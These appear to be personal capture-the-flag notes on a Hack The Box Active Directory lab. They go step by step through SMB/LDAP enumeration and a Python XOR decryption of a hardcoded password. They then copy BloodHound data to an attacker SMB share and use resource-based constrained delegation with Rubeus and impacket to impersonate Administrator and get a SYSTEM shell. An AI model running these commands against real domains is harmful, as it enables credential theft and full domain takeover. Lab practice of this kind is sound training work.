smbmap -d support.htb0 -H 10.10.11.174 -u " " -p ""
--> returned support-tools as an interesting disk with read only access

smbclient \\\\support.htb0\\support-tools -I 10.10.11.174 -U " " -p ""
--> password for workgroup was guest
$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb ??



<assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />


gobuster dns -d support.htb -t 25 -w ../../tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
--> returned nothing


ldapsearch -x -H ldap://10.10.11.174 -s base namingcontexts
--> returned details:
```Bash
dn:
namingcontexts: DC=support,DC=htb
namingcontexts: CN=Configuration,DC=support,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
namingcontexts: DC=ForestDnsZones,DC=support,DC=htb
```
And this ```ldapsearch -x -H ldap://10.10.11.174 -s base``` returned the following:
```Bash
rootDomainNamingContext: DC=support,DC=htb
ldapServiceName: support.htb:dc$@SUPPORT.HTB
```


`dig srv _ldap._tcp.dc._msdcs.child1.support.htb @10.10.11.174`
--> returned some more information about authority section"
_support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600_
--> I had not seen hostmaster.support.htb before..



# Metasploit
scanner/smb/pipe_auditor
--> `Pipes: \netlogon, \lsarpc, \samr`

scanner/smb/smb_lookupsid
-->`PIPE(LSARPC) LOCAL(SUPPORT - 5-21-1677581083-3380853377-188903654) DOMAIN(SUPPORT - 5-21-1677581083-3380853377-188903654)`



I downloaded vscode and ilspy to be able to look through the .exe files, and found a protected one in userinfo.exe:
--> password: _0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E_
(base64 decoded = ������������������ֆՖ������������)
according to the code, it seems to get the password, the string must be base64 decoded and then each character in the byte-value is XOR'd with the value from the ASCII key string (index % length of key)
must be made into a byte and XOR'd with the key-bytes from 'armando'


using python:
```Python
pwd = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
import base64
arr = base64.b64decode(pwd)
arr2 = []
for i in range(len(arr)):
	arr2.append(chr(arr[i] ^ key[i % len(key)] ^ 223)) #0xDF is 223 in decimal
for i in arr2:
	decrypted += ''.join(i)
print(decrypted) #nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

I am proceeding to use this with ldapsearch


using the information from the userinfo.exe file, I proceeded with an ldapsearch:
`ldapsearch -x -b 'dc=support,dc=htb' -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D support\\ldap` which returned ALOT of information

there were alot of users, but seems there is a smaller cn called Users, so I tried this
--> last two users were Administrator and Guest

Admin objectGUID = ltGa4T+PO0uTHnjAEEcLlw==
Guest objectGUID = lHQIHI+KY06QsghOU1eULw==


grepping for info from full search I found:
info: Ironside47pleasure40Watchful
--> whih looks like a password

`sed -n 5094p fullLDAPsearch`

now I can enumerate for users!
--> using crackmapexec:

`crackmapexec ldap 10.10.11.174 -u ../../tools/SecLists/Usernames/top-usernames-shortlist.txt -p 'Ironside47pleasure40Watchful'` returned there is a windows 10.0 Build 20348 x64
so I try to enumerate further using winrm:
`crackmapexec winrm 10.10.11.174 -u ../../tools/SecLists/Usernames/top-usernames-shortlist.txt -p 'Ironside47pleasure40Watchful'`
got a 'match' for http://10.10.11.174:5985/wsman --> deadend, so I retried with another user text file

crackmapexec winrm 10.10.11.174 -u ../../tools/SecLists/Usernames/usernames.txt -p 'Ironside47pleasure40Watchful'
--> [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)


(
1. create account
2. get sid of ^
3. get ticket (rubeus or impacket) 
4. use ticket to connect using wmiexec
)









#########################################3

foothold:
PowerView:
- clone the repositry from git + transfer to evil-winrm instance
- `import-module .\powerview.ps1` + `Get-DomainPolicy`
--> objectsid                     : S-1-5-21-1677581083-3380853377-188903654-1000

BloodHound:
- clone sharphound.ps1 from git + upload to instance
- `import-module .\sharphound.ps1` + `invoke-bloodhound -collectionmethod all -domain support.htb -ldapuser support -ldappass Ironside47pleasure40Watchful` 
--> resulted in a zip file and a .bin file (see sc)
I proceeded to download smbserver.py and executed the following:
Kali 1. `python smbserver.py share ../HTB/Support/ -smb2support -username df -password df`
Win 2. `copy 20220911092256_BloodHound.zip \\10.10.14.119\share`
3. `copy YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin \\10.10.14.119\share`
4. `net use /d \\10.10.14.119\share`
Setting up bloodhound to analyse created files:
1. `sudo neo4j console`
--> log in on http://127.0.0.1:7474 with neo4j:neo4j --> pwd changed to n304l!f3
--> from the bloodhound graph I gather that the current support.htb user is part of the users@support.htb group which is part of the admins@support.htb domain (?)


GenericWrite:
(import powerview and powermad)
1. `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`
2. `Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`
--> S-1-5-21-1677581083-3380853377-188903654-5101
3. `Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount attackersystem$`
4. `Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount`
--> check it worked
5. `$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`
6. `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"`
7. `$SDBytes = New-Object byte[] ($SD.BinaryLength)`
8. `$SD.GetBinaryForm($SDBytes, 0)`
9. `Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
`
10. `Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'`
11. `.\rubeus.exe hash /password:Summer2018! /user:attackersystem$ /domain:support.htb`

12. `.\rubeus.exe s4u /user:attackersystem$ /aes256:7B51E11634B9927104CA3B97E4F4AD49D8C110D1F9C25E3AE61C1A7F86DE0A8F /aes128:91E231CCCD3EBC4315ECC17371865544 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:http/dc.support.htb /domain:support.htb /ptt`
--> returned keys (image)
I tried following [this](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) method to a T, but it did not work.

I found another method using getST.py and smbexec.py:
1. `python getST.py support.htb/attackersystem -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 7B51E11634B9927104CA3B97E4F4AD49D8C110D1F9C25E3AE61C1A7F86DE0A8F`
--> I had to make sure to have added both _support.htb_ and _dc.support.htb_ to the /etc/hosts file
2. `export KRB5CCNAME=administrator.ccache`
3. `python /opt/impacket/examples/smbexec.py support.htb/administrator@dc.support.htb -no-pass -k`
--> this got me a _nt authority\system_ shell


Finally, I made sure to remove all files and delete the user to cover my foorprints.








